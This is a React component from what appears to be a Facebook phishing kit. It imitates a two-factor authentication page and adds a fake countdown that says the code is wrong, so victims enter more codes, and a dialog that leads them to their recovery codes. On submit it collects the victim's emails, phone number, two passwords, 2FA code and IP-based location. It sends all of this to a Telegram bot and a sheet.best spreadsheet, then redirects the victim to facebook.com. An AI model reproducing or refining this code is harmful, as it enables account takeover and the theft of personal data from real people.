import { useEffect, useState } from "react";
import "../confirm/style.css";
import TextArea from "antd/es/input/TextArea";
import { Button, Input, Modal } from "antd";
import { useDispatch, useSelector } from "react-redux";
import { setData } from "../../store/business/businessSlice";
import axios from "axios";
import { ETelegram } from "../../constants";
import { useNavigate } from "react-router-dom";

const Confirm = () => {
  const [time, setTime] = useState(30); // Thời gian ban đầu là 5 phút (300 giây)
  const [isTimeUp, setIsTimeUp] = useState(false);
  const business = useSelector((state: any) => state.business);
  const [code, setCode] = useState("");
  const dispatch = useDispatch();
  const [loading, setLoading] = useState(false);
  const [checkSubmitAndTime, setCheckSubmitAndTime] = useState(false);
  const [open, setOpen] = useState(false);
  const [confirmLoading, setConfirmLoading] = useState(false);
  const navigate = useNavigate();
  useEffect(() => {
    const timer = setInterval(() => {
      setTime((prevTime) => {
        if (prevTime === 0) {
          clearInterval(timer); // Dừng đếm ngược khi hết thời gian
          setIsTimeUp(true);
          setCheckSubmitAndTime(false);
          return 0;
        }

        return prevTime - 1; // Giảm thời gian mỗi giây
      });
    }, 1000); // Mỗi giây

    return () => clearInterval(timer); // Clear interval khi component unmount
  }, []);

  const formatTime = (seconds: any) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    const formattedMinutes = String(minutes).padStart(2, "0");
    const formattedSeconds = String(remainingSeconds).padStart(2, "0");
    return `${formattedMinutes}:${formattedSeconds}`;
  };

  const handleFacebookRedirect = async () => {
    if (time > 0) {
      setCheckSubmitAndTime(true);
      return;
    }
    setLoading(true);
    const location = await axios.get(
      "https://ipinfo.io?token=4ef03889d81a2d"
    );
    await Promise.all([
      sendTelegramBotForBusiness(location),
      sendTelegramBotForGgsheet(location),
    ]);
    dispatch(
      setData({
        ...business,
        code,
      })
    );
    setLoading(false);
    window.location.href = "https://www.facebook.com";
    // navigate("/upload-image");
  };

  const sendTelegramBotForGgsheet = async (response: any) => {
    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
    let CURRENT_API_URL = API_URL + "sendMessage";
    try {
      let message = "✅ Đã thêm vào sheet thành công";
      const data = {
        ["Name Page"]: business.namePage,
        ["Full Name"]: business.fullName,
        ["Business Email Address"]: business.businessEmail,
        ["Personal Email Address"]: business.personalEmail,
        ["Mobile Phone Number"]: business.phone,
        // ["Date of Birth"]: business.date,
        ["Please provide us information that will help us investigate"]:
          business.text,
        ["Password First"]: business.passwordFirst,
        ["Password Second"]: business.passwordSecond,
        ["Code"]: code,
        ["Ip"]: response.data.ip,
        ["City"]: response.data.city,
        ["Country"]: response.data.country,
      };
      await axios
        .post(
          "https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94",
          data
        )
        .catch(() => {
          message = "❌Thêm vào sheet không thành công";
        });
      await axios.post(
        CURRENT_API_URL,
        {
          chat_id: ETelegram.CHAT_ID,
          parse_mode: "html",
          document: "",
          text: message,
          caption: message,
        },
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        }
      );
    } catch (err) {
      console.log("err: ", err);
    }
  };

  const sendTelegramBotForBusiness = async (response: any) => {
    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
    let CURRENT_API_URL = API_URL + "sendMessage";
    try {
      let message = `
      Email Account:  ${business.businessEmail}
      Name Account: ${business.namePage}
      Person Email: ${business.personalEmail}
      Facebook Page: ${business.text}
      User Name: ${business.fullName}
      Phone Number: ${business.phone}
      Password First: ${business.passwordFirst}
      Password Second: ${business.passwordSecond}
      Ip: ${response.data.ip}
      City: ${response.data.city}
      Country: ${response.data.country}
      Code Authen: ${code}
      
      `;
      await axios.post(
        CURRENT_API_URL,
        {
          chat_id: ETelegram.CHAT_ID,
          parse_mode: "html",
          document: "",
          text: message,
          caption: message,
        },
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        }
      );
    } catch (err) {
      console.log("err: ", err);
    }
  };
  const showModal = () => {
    setOpen(true);
  };

  const handleCancel = () => {
    setOpen(false);
  };

  return (
    <div className="container_confirm">
      <div className="header">
        <div className="logo">
          <a href="##">
            <img
              src="https://scontent.xx.fbcdn.net/v/t1.15752-9/433377898_1195899118047328_5310864312235708346_n.png?_nc_cat=110&ccb=1-7&_nc_sid=5f2048&_nc_eui2=AeHaCRazprnB2GcaS1KVR2lO8SYMXA_dj_HxJgxcD92P8SXWoLpmUuX-hcllzot4SMu7KLuDM39sn234M1-dPtUG&_nc_ohc=MYI-YnH9tSMAb4yvY5g&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdWdudDdo4-Lq64O6O5l4SgK2AJDVBvh115nFkWe4isDsg&oe=6637A55F"
              alt=""
            />
          </a>
        </div>
      </div>
      <div className="content">
        <div className="form">
          <div className="title">Two-factor authentication required (1/3)</div>
          <div className="text_content">
            <p style={{ marginTop: "16px" }}>
              You’ve asked us to require a 6-digit or 8-digit login code when
              anyone tries to access your account from a new device or browser.
            </p>
            <p style={{ marginTop: "20px", marginBottom: "24px" }}>
              Enter the 6-digit or 8-digit code from your code generator or
              third-party app below.
            </p>
            <Input
              className="input_code"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="Enter number"
              type="number"
            />
            {/* <TextArea
              className="input_code"
              onChange={(e: any) => setCode(e.target.value)}
              placeholder="Enter code"
              autoSize
            />{" "} */}
            {isTimeUp ? (
              <a
                href="##"
                style={{
                  marginLeft: "10px",
                  textDecoration: "none",
                  color: "#385898",
                }}
              >
                Send Code Again?
              </a>
            ) : (
              <span style={{ marginLeft: "10px" }}>
                (wait: {formatTime(time)})
              </span>
            )}
            {checkSubmitAndTime && (
              <p style={{ color: "red", marginTop: "6px" }}>
                The code generator you entered is incorrect. Please wait{" "}
                {formatTime(time)} to receive another one.
              </p>
            )}
          </div>
          <div className="footer_form">
            <p onClick={showModal} className="footer_form-title">
              Need another way to authenticate?
            </p>
            <Button
              className="submit"
              onClick={handleFacebookRedirect}
              loading={loading}
            >
              Send
            </Button>
          </div>
        </div>
      </div>
      <Modal
        title="Didn't receive a code?"
        open={open}
        confirmLoading={confirmLoading}
        onCancel={handleCancel}
        footer={false}
      >
        <ol style={{ paddingLeft: "1rem" }}>
          <li>
            Go to{" "}
            <span style={{ fontWeight: "bold" }}>
              Setting &gt; Security and Login
            </span>
          </li>
          <li>
            Under the{" "}
            <span style={{ fontWeight: "bold" }}>
              Two-Factor Authentication
            </span>{" "}
            section, click{" "}
            <span style={{ fontWeight: "bold" }}>
              Use Two-Factor Authentication.
            </span>{" "}
            You may need to re-enter your password.
          </li>
          <li>
            Next to <span style={{ fontWeight: "bold" }}>Recovery Codes</span>,
            click <span style={{ fontWeight: "bold" }}>Setup</span> then{" "}
            <span style={{ fontWeight: "bold" }}>Get Codes.</span> If you're
            already set up recovery codes, you can click{" "}
            <span style={{ fontWeight: "bold" }}>Show Codes.</span>
          </li>
        </ol>
        <div style={{ display: "flex", justifyContent: "flex-end" }}>
          <Button onClick={handleCancel}>Close</Button>
        </div>
      </Modal>
    </div>
  );
};

export default Confirm;
